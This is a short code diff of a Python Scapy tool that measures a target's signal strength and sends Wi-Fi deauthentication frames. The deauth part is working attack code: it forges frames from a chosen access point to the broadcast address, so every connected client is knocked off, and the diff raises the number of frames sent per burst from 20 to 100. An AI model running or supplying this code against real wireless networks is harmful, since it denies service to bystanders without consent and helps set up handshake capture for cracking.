@@ -49,7 +49,7 @@ class Network:
         self.target = adr
         self.rssList = []
         self.setChannel(channel)
-        sniff(iface=self.interface, prn=self.getRssi, count=100)
+        sniff(iface=self.interface, prn=self.getRssi, count=50)
         res = -100
         try:
             res = sum(self.rssList) / len(self.rssList)
@@ -101,7 +101,7 @@ class Network:
         ap = apAdr
         client = "FF:FF:FF:FF:FF:FF"
         pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
-        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=20)
+        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=100)
 
 if __name__ == "__main__":
 
